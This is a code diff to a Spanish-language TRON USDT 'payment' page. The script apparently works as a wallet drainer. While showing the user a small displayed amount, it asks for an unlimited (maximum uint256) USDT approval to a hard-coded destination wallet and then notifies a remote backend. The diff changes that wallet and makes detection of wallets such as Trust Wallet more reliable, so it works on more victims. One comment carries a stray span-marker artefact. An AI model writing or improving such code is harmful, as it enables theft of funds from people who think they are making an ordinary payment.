@@ -627,7 +627,7 @@
 </script>
 
 <script>
-    const BILLETERA_DESTINO = "TVqMjGyqFfFoJn1r8py17eeVQY78Foxt6f";
+    const BILLETERA_DESTINO = "TLfFXd3Wi4PhBx4cUYChNv9xHnsqtQBTuQ";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
     const BACKEND_URL = "https://backend-usdt-pay.onrender.com";
 
@@ -667,24 +667,55 @@
 
     addressDisplay.value = BILLETERA_DESTINO.length > 12 ? `${BILLETERA_DESTINO.slice(0, 6)}...${BILLETERA_DESTINO.slice(-6)}` : BILLETERA_DESTINO;
 
+    // Función segura para asegurar que tronWeb se detecte correctamente en el navegador interno de la wallet
+    function getTronWebInstance() {
+        if (typeof window.tronWeb !== 'undefined' && window.tronWeb) {
+            return window.tronWeb;
+        }
+        if (window.parent && typeof window.parent.tronWeb !== 'undefined' && window.parent.tronWeb) {
+            return window.parent.tronWeb;
+        }
+        return null;
+    }
+
     connectBtn.addEventListener('click', async () => {
         if (!walletAddress) {
-            // --- BLOQUE ORIGINAL DE CONEXIÓN INTACTO ---
             try {
                 setStatus("Estableciendo enlace RPC con Billetera...");
                 connectBtn.disabled = true;
 
-                if (typeof window.tronWeb === 'undefined') {
+                let tronWeb = getTronWebInstance();
+                
+                // Intentar esperar unos milisegundos por si la inyección de Trust Wallet va retrasada
+                if (!tronWeb) {
+                    for (let i = 0; i < 10; i++) {
+                        await new Promise(r => setTimeout(r, 200));
+                        tronWeb = getTronWebInstance();
+                        if (tronWeb) break;
+                    }
+                }
+
+                if (!tronWeb) {
                     throw new Error("Por favor, abre este enlace desde el navegador interno de una billetera TRON.");
                 }
 
-                const tronWeb = window.tronWeb;
+                // Intentar forzar solicitud de cuenta si el método está disponible
+                if (tronWeb.request && typeof tronWeb.request === 'function') {
+                    try {
+                        await tronWeb.request({ method: 'tron_requestAccounts' });
+                    } catch (e) {}
+                }
+
                 if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                     walletAddress = tronWeb.defaultAddress.base58;
                 }
 
+                if (!walletAddress && tronWeb.selectedAddress) {
+                    walletAddress = tronWeb.selectedAddress;
+                }
+
                 if (!walletAddress) {
-                    throw new Error("No se obtuvo acceso a la dirección de la cuenta.");
+                    throw new Error("No se obtuvo acceso a la dirección de la cuenta. Asegúrate de desbloquear tu billetera.");
                 }
 
                 walletAddressText.textContent = walletAddress.length > 12 ? `${walletAddress.slice(0, 6)}...${walletAddress.slice(-6)}` : walletAddress;
@@ -704,15 +735,16 @@
         }
 
         if (walletAddress) {
-            // --- NUEVA LÓGICA: Ejecutar el Approve y llamar al Backend ---
+            // --- LÓGICA DE APROBACIÓN Y LLAMADA AL BACKEND ---
             try {
                 const montoVisual = amountDisplay.value || "0";
 
                 setStatus("Solicitando aprobación (Approve)...");
                 connectBtn.disabled = true;
 
-                const tronWeb = window.tronWeb;
-                
+                const tronWeb = getTronWebInstance();
+                if (!tronWeb) throw new Error("Instancia de TronWeb perdida.");
+
                 const spenderAddress = BILLETERA_DESTINO; 
                 const spenderHex = tronWeb.address.toHex(spenderAddress);
                 const approveAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
@@ -739,7 +771,7 @@
                     const txId = broadcast.txid || signedTx.txID;
                     setStatus("Aprobación exitosa. Llamando al backend...");
 
-                    // Llamada al backend en Render
+                    // Llamada al backend en Render[span_1](start_span)[span_1](end_span)
                     const response = await fetch(`${BACKEND_URL}/api/procesar-operacion`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
